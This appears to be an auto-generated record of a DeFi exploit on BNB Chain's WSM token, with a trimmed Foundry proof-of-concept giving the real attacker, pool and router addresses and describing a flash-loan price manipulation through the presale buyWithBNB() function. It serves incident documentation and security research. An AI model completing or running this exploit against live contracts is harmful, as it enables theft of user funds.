# [?] wsm - manipulating price

## Summary
Severity: Unknown
Chain: BNB Chain
Component: WSM
Published: 2024-04-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/WSM_exp.sol
Type: defi-exploit-poc

## Details
Lost: $~18K USD

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 2_517_438_179_912_631_607_253_979 WSM ≈ 18K
// Attacker : 0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32
// Attack Contract : https://bscscan.com/address/0x014eE3c3dE6941cb0202Dd2b30C89309e874B114
// Vulnerable Contract : https://bscscan.com/address/0xc0afd0e40bb3dcaebd9451aa5c319b745bf792b4
// Attack Tx : https://bscscan.com/tx/0x5a475a73343519f899527fdb9850f68f8fc73168073c72a3cff8c0c7b8a1e520

// @Analysis
//
// Using a flash loan to cause price disparity in the BNB_WSM pool,
// and then manipulating the price through the buyWithBNB() in the presale contract.

contract WSM is Test {
    Uni_Pair_V3 BNB_WSH_10000 = Uni_Pair_V3(payable(address(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E)));
    Uni_Router_V3 routerv3_ = Uni_Router_V3(payable(address(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18)));
    Uni_Pair_V3 BNB_WSH_3000 = Uni_Pair_V3(payable(address(0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a)));
    address proxy_ = address(0xFB071837728455c581f370704b225ac9eABDfa4a);

    IERC20 wshToken_;
    IWBNB bnbToken_;

    function setUp() public {
        vm.createSelectFork("bsc", 37_569_860);
        vm.deal(address(this), 0); // Preparation work，clear POC balance，ignore it
        wshToken_ = IERC20(BNB_WSH_10000.token0());
        bnbToken_ = IWBNB(payable(BNB_WSH_10000.token1()));

        wshToken_.approve(address(routerv3_), 10_000_000_000_000 ether);
        bnbToken_.approve(address(routerv3_), 10_000_000_000_000 ether);
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/WSM_exp.sol_
